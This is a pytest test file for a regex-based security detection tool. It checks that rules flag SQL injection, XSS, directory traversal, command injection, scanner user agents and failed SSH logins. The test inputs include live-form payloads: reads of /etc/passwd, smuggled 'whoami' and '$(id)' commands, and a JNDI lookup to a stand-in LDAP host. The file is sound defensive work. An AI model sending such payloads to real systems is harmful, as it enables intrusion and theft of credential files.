import pytest

from conftest import web
from regexsoc.detectors import detect_event
from regexsoc.parsers import parse_line
from regexsoc.rules import default_rules

RULES = default_rules()


def fired(line: str, year: int = 2024) -> set[str]:
    event = parse_line(line, year=year)
    return {d.rule_id for d in detect_event(event, RULES)}


@pytest.mark.parametrize("target", [
    "/item.php?id=1%27%20OR%201=1--",
    "/item.php?id=1%20UNION%20SELECT%20user,pass%20FROM%20users",
    "/x?q=1;%20DROP%20TABLE%20users",
    "/x?id=1%20AND%20SLEEP(5)",
])
def test_sql_injection_positive(target):
    assert "RULE-006" in fired(web(0, target))


@pytest.mark.parametrize("target", [
    "/search?q=how+to+select+a+laptop",
    "/list?action=select&from=2020",
    "/blog/why-select-from-menus-matters",
    "/products?id=12&order=asc",
])
def test_sql_injection_false_positives(target):
    assert "RULE-006" not in fired(web(0, target))


@pytest.mark.parametrize("target", [
    "/s?q=%3Cscript%3Ealert(1)%3C/script%3E",
    "/s?q=%3Cimg%20src=x%20onerror=alert(1)%3E",
    "/s?u=javascript:alert(1)",
])
def test_xss_positive(target):
    assert "RULE-007" in fired(web(0, target))


def test_xss_false_positive_plain_text():
    assert "RULE-007" not in fired(web(0, "/s?q=javascript+tutorial+for+beginners"))


@pytest.mark.parametrize("target", [
    "/dl?file=../../etc/passwd",
    "/dl?file=..%2f..%2fetc%2fpasswd",
    "/dl?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd",  # double-encoded
    "/dl?file=..\\..\\windows\\win.ini",
])
def test_directory_traversal_positive_including_encoded(target):
    assert "RULE-008" in fired(web(0, target))


def test_directory_traversal_negative():
    assert "RULE-008" not in fired(web(0, "/docs/v1.2/readme.html"))


@pytest.mark.parametrize("target", ["/p?host=8.8.8.8;cat%20/etc/passwd", "/p?x=1%7Cwhoami", "/p?x=$(id)",
                                    "/p?x=%24%7Bjndi:ldap://a.example.com/x%7D"])
def test_command_injection_positive(target):
    assert "RULE-009" in fired(web(0, target))


@pytest.mark.parametrize("target", ["/p?a=1&b=2", "/p?x=a|id=5", "/p?name=sh", "/p?q=cat+food"])
def test_command_injection_false_positives(target):
    assert "RULE-009" not in fired(web(0, target))


@pytest.mark.parametrize("target", ["/.env", "/wp-config.php", "/etc/passwd", "/admin/", "/backup.sql", "/.git/config"])
def test_sensitive_file_access_positive(target):
    assert "RULE-010" in fired(web(0, target))


@pytest.mark.parametrize("target", ["/administrator-guide.html", "/about", "/login", "/static/configuration-tips.css"])
def test_sensitive_file_access_negative(target):
    assert "RULE-010" not in fired(web(0, target))


def test_suspicious_user_agent():
    assert "RULE-013" in fired(web(0, "/", ua="sqlmap/1.7.2#stable"))
    assert "RULE-013" in fired(web(0, "/", ua="Mozilla/5.00 (Nikto/2.1.6)"))
    assert "RULE-013" not in fired(web(0, "/", ua="Mozilla/5.0 (Windows NT 10.0) Chrome/124"))


def test_failed_ssh_login_rule():
    assert "RULE-001" in fired("Mar 10 10:15:01 h sshd[1]: Failed password for root from 203.0.113.5 port 22 ssh2")
    assert "RULE-001" not in fired("Mar 10 10:15:01 h sshd[1]: Accepted password for root from 203.0.113.5 port 22 ssh2")


def test_successful_login_is_parsed_and_not_flagged_as_failure():
    line = "Mar 10 10:15:01 h sshd[1]: Accepted publickey for alice from 192.0.2.10 port 22 ssh2"
    assert parse_line(line, year=2024).event_type == "LOGIN_SUCCESS"
    assert fired(line) == set()


def test_disabled_rule_does_not_fire():
    rules = default_rules()
    for r in rules:
        if r.id == "RULE-006":
            r.enabled = False
    event = parse_line(web(0, "/x?id=1%20OR%201=1"))
    assert "RULE-006" not in {d.rule_id for d in detect_event(event, rules)}


def test_detection_explains_why():
    d = next(d for d in detect_event(parse_line(web(0, "/dl?f=../../x")), RULES) if d.rule_id == "RULE-008")
    assert "matched" in d.reason.lower() and d.evidence and d.recommended_response
